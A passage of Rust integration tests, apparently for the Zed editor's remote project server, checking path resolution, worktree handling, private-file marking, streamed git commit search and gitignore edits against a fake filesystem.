        .await
        .unwrap();
    assert!(path.is_file());
    assert_eq!(path.abs_path().unwrap(), path!("/code/project2/README.md"));

    let path = project
        .update(cx, |project, cx| {
            project.resolve_path_in_buffer("../README.md", &buffer2, cx)
        })
        .await
        .unwrap();
    assert!(path.is_file());
    assert_eq!(
        path.project_path().unwrap().clone(),
        (worktree2_id, rel_path("README.md")).into()
    );

    let path = project
        .update(cx, |project, cx| {
            project.resolve_path_in_buffer("../src", &buffer2, cx)
        })
        .await
        .unwrap();
    assert_eq!(
        path.project_path().unwrap().clone(),
        (worktree2_id, rel_path("src")).into()
    );
    assert!(path.is_dir());
}

#[gpui::test]
async fn test_remote_resolve_abs_path(cx: &mut TestAppContext, server_cx: &mut TestAppContext) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
                "README.md": "# project 1",
                "src": {
                    "lib.rs": "fn one() -> usize { 1 }"
                }
            },
        }),
    )
    .await;

    let (project, _headless) = init_test(&fs, cx, server_cx).await;

    let path = project
        .update(cx, |project, cx| {
            project.resolve_abs_path(path!("/code/project1/README.md"), cx)
        })
        .await
        .unwrap();

    assert!(path.is_file());
    assert_eq!(path.abs_path().unwrap(), path!("/code/project1/README.md"));

    let path = project
        .update(cx, |project, cx| {
            project.resolve_abs_path(path!("/code/project1/src"), cx)
        })
        .await
        .unwrap();

    assert!(path.is_dir());
    assert_eq!(path.abs_path().unwrap(), path!("/code/project1/src"));

    let path = project
        .update(cx, |project, cx| {
            project.resolve_abs_path(path!("/code/project1/DOESNOTEXIST"), cx)
        })
        .await;
    assert!(path.is_none());
}

#[gpui::test(iterations = 10)]
async fn test_canceling_buffer_opening(cx: &mut TestAppContext, server_cx: &mut TestAppContext) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        "/code",
        json!({
            "project1": {
                ".git": {},
                "README.md": "# project 1",
                "src": {
                    "lib.rs": "fn one() -> usize { 1 }"
                }
            },
        }),
    )
    .await;

    let (project, _headless) = init_test(&fs, cx, server_cx).await;
    let (worktree, _) = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree("/code/project1", true, cx)
        })
        .await
        .unwrap();
    let worktree_id = worktree.read_with(cx, |tree, _| tree.id());

    // Open a buffer on the client but cancel after a random amount of time.
    let buffer = project.update(cx, |p, cx| {
        p.open_buffer((worktree_id, rel_path("src/lib.rs")), cx)
    });
    cx.executor().simulate_random_delay().await;
    drop(buffer);

    // Try opening the same buffer again as the client, and ensure we can
    // still do it despite the cancellation above.
    let buffer = project
        .update(cx, |p, cx| {
            p.open_buffer((worktree_id, rel_path("src/lib.rs")), cx)
        })
        .await
        .unwrap();

    buffer.read_with(cx, |buf, _| {
        assert_eq!(buf.text(), "fn one() -> usize { 1 }")
    });
}

#[gpui::test]
async fn test_adding_then_removing_then_adding_worktrees(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
                "README.md": "# project 1",
                "src": {
                    "lib.rs": "fn one() -> usize { 1 }"
                }
            },
            "project2": {
                "README.md": "# project 2",
            },
        }),
    )
    .await;

    let (project, _headless) = init_test(&fs, cx, server_cx).await;
    let (_worktree, _) = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap();

    let (worktree_2, _) = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project2"), true, cx)
        })
        .await
        .unwrap();
    let worktree_id_2 = worktree_2.read_with(cx, |tree, _| tree.id());

    project.update(cx, |project, cx| project.remove_worktree(worktree_id_2, cx));

    let (worktree_2, _) = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project2"), true, cx)
        })
        .await
        .unwrap();

    cx.run_until_parked();
    worktree_2.update(cx, |worktree, _cx| {
        assert!(worktree.is_visible());
        let entries = worktree.entries(true, 0).collect::<Vec<_>>();
        assert_eq!(entries.len(), 2);
        assert_eq!(entries[1].path.as_unix_str(), "README.md")
    })
}

#[gpui::test]
async fn test_open_server_settings(cx: &mut TestAppContext, server_cx: &mut TestAppContext) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
                "README.md": "# project 1",
                "src": {
                    "lib.rs": "fn one() -> usize { 1 }"
                }
            },
        }),
    )
    .await;

    let (project, _headless) = init_test(&fs, cx, server_cx).await;
    let buffer = project.update(cx, |project, cx| project.open_server_settings(cx));
    cx.executor().run_until_parked();

    let buffer = buffer.await.unwrap();

    cx.update(|cx| {
        assert_eq!(
            buffer.read(cx).text(),
            initial_server_settings_content()
                .to_string()
                .replace("\r\n", "\n")
        )
    })
}

#[gpui::test(iterations = 20)]
async fn test_reconnect(cx: &mut TestAppContext, server_cx: &mut TestAppContext) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
                "README.md": "# project 1",
                "src": {
                    "lib.rs": "fn one() -> usize { 1 }"
                }
            },
        }),
    )
    .await;

    let (project, _headless) = init_test(&fs, cx, server_cx).await;

    let (worktree, _) = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap();

    let worktree_id = worktree.read_with(cx, |worktree, _| worktree.id());
    let buffer = project
        .update(cx, |project, cx| {
            project.open_buffer((worktree_id, rel_path("src/lib.rs")), cx)
        })
        .await
        .unwrap();

    buffer.update(cx, |buffer, cx| {
        assert_eq!(buffer.text(), "fn one() -> usize { 1 }");
        let ix = buffer.text().find('1').unwrap();
        buffer.edit([(ix..ix + 1, "100")], None, cx);
    });

    let client = cx.read(|cx| project.read(cx).remote_client().unwrap());
    let reconnected = Arc::new(AtomicBool::new(false));
    let _subscription = cx.update(|cx| {
        let reconnected = reconnected.clone();
        cx.subscribe(&client, move |_client, event, _cx| {
            if matches!(event, RemoteClientEvent::Reconnected) {
                reconnected.store(true, Ordering::SeqCst);
            }
        })
    });
    client
        .update(cx, |client, cx| client.simulate_disconnect(cx))
        .detach();

    project
        .update(cx, |project, cx| project.save_buffer(buffer.clone(), cx))
        .await
        .unwrap();

    assert_eq!(
        fs.load(path!("/code/project1/src/lib.rs").as_ref())
            .await
            .unwrap(),
        "fn one() -> usize { 100 }"
    );

    cx.run_until_parked();
    assert!(
        reconnected.load(Ordering::SeqCst),
        "a successful reconnect should emit RemoteClientEvent::Reconnected"
    );
}

#[gpui::test]
async fn test_remote_root_rename(cx: &mut TestAppContext, server_cx: &mut TestAppContext) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        "/code",
        json!({
            "project1": {
                ".git": {},
                "README.md": "# project 1",
            },
        }),
    )
    .await;

    let (project, _) = init_test(&fs, cx, server_cx).await;

    let (worktree, _) = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree("/code/project1", true, cx)
        })
        .await
        .unwrap();

    cx.run_until_parked();

    fs.rename(
        &PathBuf::from("/code/project1"),
        &PathBuf::from("/code/project2"),
        Default::default(),
    )
    .await
    .unwrap();

    cx.run_until_parked();
    worktree.update(cx, |worktree, _| {
        assert_eq!(worktree.root_name(), "project2")
    })
}

#[gpui::test]
async fn test_remote_rename_entry(cx: &mut TestAppContext, server_cx: &mut TestAppContext) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        "/code",
        json!({
            "project1": {
                ".git": {},
                "README.md": "# project 1",
            },
        }),
    )
    .await;

    let (project, _) = init_test(&fs, cx, server_cx).await;
    let (worktree, _) = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree("/code/project1", true, cx)
        })
        .await
        .unwrap();

    cx.run_until_parked();

    let entry = project
        .update(cx, |project, cx| {
            let worktree = worktree.read(cx);
            let entry = worktree.entry_for_path(rel_path("README.md")).unwrap();
            project.rename_entry(entry.id, (worktree.id(), rel_path("README.rst")).into(), cx)
        })
        .await
        .unwrap()
        .into_included()
        .unwrap();

    cx.run_until_parked();

    worktree.update(cx, |worktree, _| {
        assert_eq!(
            worktree.entry_for_path(rel_path("README.rst")).unwrap().id,
            entry.id
        )
    });
}

#[gpui::test]
async fn test_remote_rescan_worktrees(cx: &mut TestAppContext, server_cx: &mut TestAppContext) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                "README.md": "# project 1",
                "removed.txt": "",
            },
        }),
    )
    .await;

    let (project, _headless_project) = init_test(&fs, cx, server_cx).await;
    let (worktree, _) = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap();
    cx.run_until_parked();

    fs.pause_events();
    fs.insert_file(path!("/code/project1/created.txt"), Vec::new())
        .await;
    fs.remove_file(
        Path::new(path!("/code/project1/removed.txt")),
        Default::default(),
    )
    .await
    .unwrap();
    // The server's watcher never reports these changes.
    fs.clear_buffered_events();
    fs.unpause_events_and_flush();
    cx.run_until_parked();

    worktree.read_with(cx, |worktree, _| {
        assert!(worktree.entry_for_path(rel_path("created.txt")).is_none());
        assert!(worktree.entry_for_path(rel_path("removed.txt")).is_some());
    });

    project
        .update(cx, |project, cx| project.rescan_worktrees(cx))
        .await
        .unwrap();

    worktree.read_with(cx, |worktree, _| {
        assert!(worktree.entry_for_path(rel_path("created.txt")).is_some());
        assert!(worktree.entry_for_path(rel_path("removed.txt")).is_none());
    });
}

#[gpui::test]
async fn test_remote_entries_carry_the_hosts_private_files_verdict(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".env": "SECRET=1",
                "main.rs": "fn main() {}",
            },
        }),
    )
    .await;

    let (project, _headless_project) = init_test(&fs, cx, server_cx).await;
    let (worktree, _) = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap();
    cx.run_until_parked();

    let worktree_id = worktree.read_with(cx, |worktree, _| {
        assert!(worktree.is_remote());
        let env_entry = worktree.entry_for_path(rel_path(".env")).unwrap();
        assert!(env_entry.is_private);
        let main_entry = worktree.entry_for_path(rel_path("main.rs")).unwrap();
        assert!(!main_entry.is_private);
        worktree.id()
    });

    let env_buffer = project
        .update(cx, |project, cx| {
            project.open_buffer((worktree_id, rel_path(".env")), cx)
        })
        .await
        .unwrap();
    let main_buffer = project
        .update(cx, |project, cx| {
            project.open_buffer((worktree_id, rel_path("main.rs")), cx)
        })
        .await
        .unwrap();
    env_buffer.read_with(cx, |buffer, _| {
        assert!(buffer.file().unwrap().is_private());
    });
    main_buffer.read_with(cx, |buffer, _| {
        assert!(!buffer.file().unwrap().is_private());
    });
}

#[gpui::test]
async fn test_copy_file_into_remote_project(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let remote_fs = FakeFs::new(server_cx.executor());
    remote_fs
        .insert_tree(
            path!("/code"),
            json!({
                "project1": {
                    ".git": {},
                    "README.md": "# project 1",
                    "src": {
                        "main.rs": ""
                    }
                },
            }),
        )
        .await;

    let (project, _) = init_test(&remote_fs, cx, server_cx).await;
    let (worktree, _) = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap();

    cx.run_until_parked();

    let local_fs = project
        .read_with(cx, |project, _| project.fs().clone())
        .as_fake();
    local_fs
        .insert_tree(
            path!("/local-code"),
            json!({
                "dir1": {
                    "file1": "file 1 content",
                    "dir2": {
                        "file2": "file 2 content",
                        "dir3": {
                            "file3": ""
                        },
                        "dir4": {}
                    },
                    "dir5": {}
                },
                "file4": "file 4 content"
            }),
        )
        .await;

    worktree
        .update(cx, |worktree, cx| {
            worktree.copy_external_entries(
                rel_path("src").into(),
                vec![
                    Path::new(path!("/local-code/dir1/file1")).into(),
                    Path::new(path!("/local-code/dir1/dir2")).into(),
                ],
                local_fs.clone(),
                cx,
            )
        })
        .await
        .unwrap();

    assert_eq!(
        remote_fs.paths(true),
        vec![
            PathBuf::from(path!("/")),
            PathBuf::from(path!("/code")),
            PathBuf::from(path!("/code/project1")),
            PathBuf::from(path!("/code/project1/.git")),
            PathBuf::from(path!("/code/project1/README.md")),
            PathBuf::from(path!("/code/project1/src")),
            PathBuf::from(path!("/code/project1/src/dir2")),
            PathBuf::from(path!("/code/project1/src/file1")),
            PathBuf::from(path!("/code/project1/src/main.rs")),
            PathBuf::from(path!("/code/project1/src/dir2/dir3")),
            PathBuf::from(path!("/code/project1/src/dir2/dir4")),
            PathBuf::from(path!("/code/project1/src/dir2/file2")),
            PathBuf::from(path!("/code/project1/src/dir2/dir3/file3")),
        ]
    );
    assert_eq!(
        remote_fs
            .load(path!("/code/project1/src/file1").as_ref())
            .await
            .unwrap(),
        "file 1 content"
    );
    assert_eq!(
        remote_fs
            .load(path!("/code/project1/src/dir2/file2").as_ref())
            .await
            .unwrap(),
        "file 2 content"
    );
    assert_eq!(
        remote_fs
            .load(path!("/code/project1/src/dir2/dir3/file3").as_ref())
            .await
            .unwrap(),
        ""
    );
}

#[gpui::test]
async fn test_remote_root_repo_common_dir(cx: &mut TestAppContext, server_cx: &mut TestAppContext) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        "/code",
        json!({
            "main_repo": {
                ".git": {},
                "file.txt": "content",
            },
            "no_git": {
                "file.txt": "content",
            },
        }),
    )
    .await;

    // Create a linked worktree that points back to main_repo's .git.
    fs.add_linked_worktree_for_repo(
        Path::new("/code/main_repo/.git"),
        false,
        GitWorktree {
            path: PathBuf::from("/code/linked_worktree"),
            ref_name: Some("refs/heads/feature-branch".into()),
            sha: "abc123".into(),
            is_main: false,
            is_bare: false,
        },
    )
    .await;

    let (project, _headless) = init_test(&fs, cx, server_cx).await;

    // Main repo: root_repo_common_dir should be the .git directory itself.
    let (worktree_main, _) = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree("/code/main_repo", true, cx)
        })
        .await
        .unwrap();
    cx.executor().run_until_parked();

    let (common_dir, is_linked_worktree) = worktree_main.read_with(cx, |worktree, _| {
        (
            worktree.snapshot().root_repo_common_dir().cloned(),
            worktree.snapshot().root_repo_is_linked_worktree(),
        )
    });
    assert_eq!(
        common_dir.as_deref(),
        Some(Path::new("/code/main_repo/.git")),
    );
    assert!(!is_linked_worktree);

    // Linked worktree: root_repo_common_dir should point to the main repo's .git.
    let (worktree_linked, _) = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree("/code/linked_worktree", true, cx)
        })
        .await
        .unwrap();
    cx.executor().run_until_parked();

    let (common_dir, is_linked_worktree) = worktree_linked.read_with(cx, |worktree, _| {
        (
            worktree.snapshot().root_repo_common_dir().cloned(),
            worktree.snapshot().root_repo_is_linked_worktree(),
        )
    });
    assert_eq!(
        common_dir.as_deref(),
        Some(Path::new("/code/main_repo/.git")),
    );
    assert!(is_linked_worktree);

    let main_worktree_paths = project.read_with(cx, |project, cx| {
        project
            .worktree_paths(cx)
            .main_worktree_path_list()
            .ordered_paths()
            .map(|path| path.to_path_buf())
            .collect::<Vec<_>>()
    });
    assert_eq!(
        main_worktree_paths,
        vec![
            PathBuf::from("/code/main_repo"),
            PathBuf::from("/code/main_repo"),
        ]
    );

    // No git repo: root_repo_common_dir should be None.
    let (worktree_no_git, _) = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree("/code/no_git", true, cx)
        })
        .await
        .unwrap();
    cx.executor().run_until_parked();

    let (common_dir, is_linked_worktree) = worktree_no_git.read_with(cx, |worktree, _| {
        (
            worktree.snapshot().root_repo_common_dir().cloned(),
            worktree.snapshot().root_repo_is_linked_worktree(),
        )
    });
    assert_eq!(common_dir, None);
    assert!(!is_linked_worktree);
}

#[gpui::test]
async fn test_remote_search_commits_streams_proto_chunks(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    const COMMIT_COUNT: usize = 900;
    const RESPONSE_MAX_SIZE: usize = 100;

    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
                "file.txt": "content",
            },
        }),
    )
    .await;

    let commit_data = (0..COMMIT_COUNT)
        .map(|index| {
            let sha = Oid::from_str(&format!("{:040x}", index + 1)).unwrap();
            (
                CommitData {
                    sha,
                    parents: Default::default(),
                    author_name: SharedString::from("Author"),
                    author_email: SharedString::from("author@example.com"),
                    commit_timestamp: index as i64,
                    subject: SharedString::from(format!("Subject {index}")),
                    message: SharedString::from(format!("needle commit {index}")),
                },
                false,
            )
        })
        .collect::<Vec<_>>();
    let expected_shas = commit_data
        .iter()
        .map(|(commit_data, _)| commit_data.sha.to_string())
        .collect::<HashSet<_>>();
    fs.set_commit_data(Path::new(path!("/code/project1/.git")), commit_data);

    let (project, _headless) = init_test(&fs, cx, server_cx).await;
    project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .expect("should open remote worktree");
    server_cx.run_until_parked();
    cx.run_until_parked();
    project
        .update(cx, |project, cx| project.git_scans_complete(cx))
        .await;

    let (remote_client, repository_id) = project.read_with(cx, |project, cx| {
        let repository = project
            .active_repository(cx)
            .expect("remote project should have an active repository");
        let repository_id = repository.read(cx).snapshot().id;
        let remote_client = project
            .remote_client()
            .expect("project should have a remote client");
        (remote_client, repository_id)
    });
    let proto_client = remote_client.read_with(cx, |remote_client, _| remote_client.proto_client());
    let mut stream = proto_client
        .request_stream(proto::SearchCommits {
            project_id: proto::REMOTE_SERVER_PROJECT_ID,
            repository_id: repository_id.to_proto(),
            log_source: Some(proto::GitLogSource {
                source: Some(proto::git_log_source::Source::All(
                    proto::GitLogSourceAll {},
                )),
            }),
            query: "needle".to_string(),
            case_sensitive: true,
            ..Default::default()
        })
        .await
        .expect("search commits stream should start");

    let mut chunks = Vec::new();
    let mut filters_versions = Vec::new();
    while let Some(response) = futures::StreamExt::next(&mut stream).await {
        let response = response.expect("search commits chunk should succeed");
        filters_versions.push(response.filters_version);
        chunks.push(response.shas);
    }
    assert!(
        filters_versions.first().is_some_and(Option::is_some),
        "the first answer says the server applies every filter"
    );
    let chunks = chunks
        .into_iter()
        .filter(|chunk| !chunk.is_empty())
        .collect::<Vec<_>>();

    assert!(
        chunks.len() > 1,
        "expected search results to stream in multiple chunks"
    );
    for chunk in chunks.iter().take(chunks.len() - 1) {
        assert!(
            chunk.len() <= RESPONSE_MAX_SIZE,
            "non-final chunks should meet the target byte size"
        );
    }

    let actual_shas = chunks.into_iter().flatten().collect::<HashSet<_>>();
    assert_eq!(actual_shas, expected_shas);
}

#[gpui::test]
async fn test_remote_search_commits_applies_the_filters_after_author(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
                "file.txt": "content",
            },
        }),
    )
    .await;

    let sha = |byte: u8| Oid::from_bytes(&[byte; 20]).unwrap();
    let commit = |byte: u8, author: &str, timestamp: i64, parents: usize| {
        (
            CommitData {
                sha: sha(byte),
                parents: (0..parents).map(|parent| sha(100 + parent as u8)).collect(),
                author_name: SharedString::from(author.to_string()),
                author_email: SharedString::from("someone@example.com"),
                commit_timestamp: timestamp,
                subject: SharedString::from("subject"),
                message: SharedString::from("needle"),
            },
            false,
        )
    };
    fs.set_commit_data(
        Path::new(path!("/code/project1/.git")),
        [
            commit(1, "山田 太郎", 100, 1),
            commit(2, "山田 花子", 200, 1),
            commit(3, "山田 太郎", 300, 2),
            commit(4, "鈴木 太郎", 400, 1),
        ],
    );

    let (project, _headless) = init_test(&fs, cx, server_cx).await;
    project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .expect("should open remote worktree");
    server_cx.run_until_parked();
    cx.run_until_parked();
    project
        .update(cx, |project, cx| project.git_scans_complete(cx))
        .await;
    let repository = project.read_with(cx, |project, cx| {
        project
            .active_repository(cx)
            .expect("remote project should have an active repository")
    });

    let search = |args: git::repository::SearchCommitArgs, cx: &mut TestAppContext| {
        let (request_tx, request_rx) = smol::channel::unbounded();
        let task = repository.update(cx, |repository, cx| {
            repository.search_commits(git::repository::LogSource::All, args, request_tx, cx)
        });
        async move {
            let result = task.await;
            let mut found = Vec::new();
            while let Ok(oid) = request_rx.try_recv() {
                found.push(oid);
            }
            found.sort_by_key(|oid| oid.to_string());
            (result, found)
        }
    };

    // Two authors, a period and no merges: all filters an older server would have dropped.
    let task = search(
        git::repository::SearchCommitArgs {
            query: "needle".into(),
            authors: vec!["山田".into(), "太郎".into()],
            since: Some(50),
            until: Some(350),
            merges: git::commit_search::MergeFilter::Exclude,
            ..Default::default()
        },
        cx,
    );
    server_cx.run_until_parked();
    cx.run_until_parked();
    let (result, found) = task.await;
    result.expect("the search should succeed");
    assert_eq!(found, [sha(1)]);

    let task = search(
        git::repository::SearchCommitArgs {
            commits: Some(vec![sha(2), sha(4)]),
            ..Default::default()
        },
        cx,
    );
    server_cx.run_until_parked();
    cx.run_until_parked();
    let (result, found) = task.await;
    result.expect("the search should succeed");
    assert_eq!(found, [sha(2), sha(4)]);

    // The server's reason for refusing a search reaches the client.
    let task = search(
        git::repository::SearchCommitArgs {
            path: Some("src".into()),
            ..Default::default()
        },
        cx,
    );
    server_cx.run_until_parked();
    cx.run_until_parked();
    let (result, found) = task.await;
    assert!(result.is_err());
    assert!(found.is_empty());
}

#[gpui::test]
async fn test_remote_search_commits_stops_at_the_result_limit(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let limit = git::commit_search::COMMIT_SEARCH_RESULT_LIMIT;
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
                "file.txt": "content",
            },
        }),
    )
    .await;
    fs.set_commit_data(
        Path::new(path!("/code/project1/.git")),
        (0..limit + 50).map(|index| {
            (
                CommitData {
                    sha: Oid::from_str(&format!("{:040x}", index + 1)).unwrap(),
                    parents: Default::default(),
                    author_name: SharedString::from("Author"),
                    author_email: SharedString::from("author@example.com"),
                    commit_timestamp: index as i64,
                    subject: SharedString::from("subject"),
                    message: SharedString::from("needle"),
                },
                false,
            )
        }),
    );

    let (project, _headless) = init_test(&fs, cx, server_cx).await;
    project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .expect("should open remote worktree");
    server_cx.run_until_parked();
    cx.run_until_parked();
    project
        .update(cx, |project, cx| project.git_scans_complete(cx))
        .await;
    let repository = project.read_with(cx, |project, cx| {
        project
            .active_repository(cx)
            .expect("remote project should have an active repository")
    });

    let (request_tx, request_rx) = smol::channel::unbounded();
    let task = repository.update(cx, |repository, cx| {
        repository.search_commits(
            git::repository::LogSource::All,
            git::repository::SearchCommitArgs {
                query: "needle".into(),
                ..Default::default()
            },
            request_tx,
            cx,
        )
    });
    server_cx.run_until_parked();
    cx.run_until_parked();
    task.await.expect("the search should succeed");
    let mut found_count = 0;
    while request_rx.try_recv().is_ok() {
        found_count += 1;
    }
    // The client cannot tell the server to stop, so the server stops at the limit itself rather
    // than sending the whole history over for the client to throw away.
    assert_eq!(found_count, limit);
}

#[gpui::test]
async fn test_remote_search_commits_stops_the_servers_search_when_dropped(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
                "file.txt": "content",
            },
        }),
    )
    .await;
    let dot_git = Path::new(path!("/code/project1/.git"));
    // One chunk's worth, which the server sends on while its search goes on.
    fs.set_commit_data(
        dot_git,
        (0..100).map(|index| {
            (
                CommitData {
                    sha: Oid::from_str(&format!("{:040x}", index + 1)).unwrap(),
                    parents: Default::default(),
                    author_name: SharedString::from("Author"),
                    author_email: SharedString::from("author@example.com"),
                    commit_timestamp: index as i64,
                    subject: SharedString::from("subject"),
                    message: SharedString::from("needle"),
                },
                false,
            )
        }),
    );
    let hold = Arc::new(());
    fs.set_commit_search_hold(dot_git, Some(hold.clone()));
    let running_searches = |hold: &Arc<()>| Arc::strong_count(hold) - 2;

    let (project, _headless) = init_test(&fs, cx, server_cx).await;
    project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .expect("should open remote worktree");
    server_cx.run_until_parked();
    cx.run_until_parked();
    project
        .update(cx, |project, cx| project.git_scans_complete(cx))
        .await;
    let repository = project.read_with(cx, |project, cx| {
        project
            .active_repository(cx)
            .expect("remote project should have an active repository")
    });

    let (request_tx, request_rx) = smol::channel::unbounded();
    let task = repository.update(cx, |repository, cx| {
        repository.search_commits(
            git::repository::LogSource::All,
            git::repository::SearchCommitArgs {
                query: "needle".into(),
                ..Default::default()
            },
            request_tx,
            cx,
        )
    });
    server_cx.run_until_parked();
    cx.run_until_parked();
    server_cx.run_until_parked();
    assert!(request_rx.try_recv().is_ok(), "the first chunk arrives");
    assert_eq!(running_searches(&hold), 1, "the server is still searching");

    // What the 中止 button and a new search do: drop the running search.
    drop(task);
    cx.run_until_parked();
    server_cx.run_until_parked();
    assert_eq!(
        running_searches(&hold),
        0,
        "dropping the search on the client stops the server's search"
    );
}

#[gpui::test]
async fn test_remote_archive_git_operations_are_supported(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        "/project",
        json!({
            ".git": {},
            "file.txt": "content",
        }),
    )
    .await;
    fs.set_branch_name(Path::new("/project/.git"), Some("main"));
    fs.set_head_for_repo(
        Path::new("/project/.git"),
        &[("file.txt", "content".into())],
        "head-sha",
    );

    let (project, _headless) = init_test(&fs, cx, server_cx).await;
    project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(Path::new("/project"), true, cx)
        })
        .await
        .expect("should open remote worktree");
    cx.run_until_parked();

    let repository = project.read_with(cx, |project, cx| {
        project
            .active_repository(cx)
            .expect("remote project should have an active repository")
    });

    let head_sha = cx
        .update(|cx| repository.update(cx, |repository, _| repository.head_sha()))
        .await
        .expect("head_sha request should complete")
        .expect("head_sha should succeed")
        .expect("HEAD should exist");

    cx.run_until_parked();

    cx.update(|cx| {
        repository.update(cx, |repository, _| {
            repository.update_ref("refs/zed-tests/archive-checkpoint".to_string(), head_sha)
        })
    })
    .await
    .expect("update_ref request should complete")
    .expect("update_ref should succeed for remote repository");

    cx.run_until_parked();

    cx.update(|cx| {
        repository.update(cx, |repository, _| {
            repository.delete_ref("refs/zed-tests/archive-checkpoint".to_string())
        })
    })
    .await
    .expect("delete_ref request should complete")
    .expect("delete_ref should succeed for remote repository");

    cx.run_until_parked();

    cx.update(|cx| repository.update(cx, |repository, _| repository.repair_worktrees()))
        .await
        .expect("repair_worktrees request should complete")
        .expect("repair_worktrees should succeed for remote repository");

    cx.run_until_parked();

    let (staged_commit_sha, unstaged_commit_sha) = cx
        .update(|cx| repository.update(cx, |repository, _| repository.create_archive_checkpoint()))
        .await
        .expect("create_archive_checkpoint request should complete")
        .expect("create_archive_checkpoint should succeed for remote repository");

    cx.run_until_parked();

    cx.update(|cx| {
        repository.update(cx, |repository, _| {
            repository.restore_archive_checkpoint(staged_commit_sha, unstaged_commit_sha)
        })
    })
    .await
    .expect("restore_archive_checkpoint request should complete")
    .expect("restore_archive_checkpoint should succeed for remote repository");
}

#[gpui::test]
async fn test_add_path_to_gitignore_in_remote_repository(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        "/project",
        json!({
            ".git": {},
            ".gitignore": "existing\n",
            "logs": {
                "app.log": ""
            },
            "tmp.txt": "",
        }),
    )
    .await;
    fs.set_branch_name(Path::new("/project/.git"), Some("main"));
    fs.set_head_for_repo(
        Path::new("/project/.git"),
        &[(".gitignore", "existing\n".into())],
        "head-sha",
    );

    let (project, _headless) = init_test(&fs, cx, server_cx).await;
    project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(Path::new("/project"), true, cx)
        })
        .await
        .expect("should open remote worktree");
    cx.run_until_parked();

    let repository = project.read_with(cx, |project, cx| {
        project
            .active_repository(cx)
            .expect("remote project should have an active repository")
    });

    for (path, is_dir) in [("tmp.txt", false), ("logs", true), ("tmp.txt", false)] {
        let repo_path = RepoPath::new(path).expect("path should be a valid repo path");
        cx.update(|cx| {
            repository.update(cx, |repository, _| {
                repository.add_path_to_gitignore(&repo_path, is_dir)
            })
        })
        .await
        .expect("add to .gitignore request should complete")
        .expect("add to .gitignore should succeed for remote repository");
    }

    server_cx.run_until_parked();
    cx.run_until_parked();

    assert_eq!(
        fs.load(Path::new("/project/.gitignore"))
            .await
            .expect(".gitignore should be readable"),
        "existing\ntmp.txt\nlogs/\n"
    );
}

#[gpui::test]
async fn test_add_path_to_git_info_exclude_in_remote_repository(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        "/project",
        json!({
            ".git": {},
            "logs": {
                "app.log": ""
            },
            "tmp.txt": "",
        }),
    )
    .await;
    fs.set_branch_name(Path::new("/project/.git"), Some("main"));
    fs.set_head_for_repo(Path::new("/project/.git"), &[], "head-sha");

    let (project, _headless) = init_test(&fs, cx, server_cx).await;
    project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(Path::new("/project"), true, cx)
        })
        .await
        .expect("should open remote worktree");
    cx.run_until_parked();

    let repository = project.read_with(cx, |project, cx| {
        project
